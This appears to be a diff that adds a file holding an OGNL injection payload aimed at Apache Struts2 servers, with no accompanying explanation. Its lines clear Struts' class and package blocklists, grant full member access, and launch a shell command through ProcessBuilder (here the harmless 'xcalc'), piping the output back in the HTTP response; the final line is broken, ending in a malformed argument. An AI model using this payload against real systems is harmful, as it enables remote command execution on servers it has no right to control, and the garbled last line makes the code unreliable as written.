@@ -1,0 +1,12 @@
+#container=#context['com.opensymphony.xwork2.ActionContext.container']
+#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)
+#ognlUtil.getExcludedClasses().clear()
+#ognlUtil.getExcludedPackageNames().clear()
+#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
+#context.setMemberAccess(#dm)
+#cmd={'/bin/bash','-c','xcalc'}
+#p=new java.lang.ProcessBuilder(#cmd)
+#p.redirectErrorStream(true)
+#process=#p.start()
+#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())
+@org.apache.commons.io.IOUtils@copy(#processget)
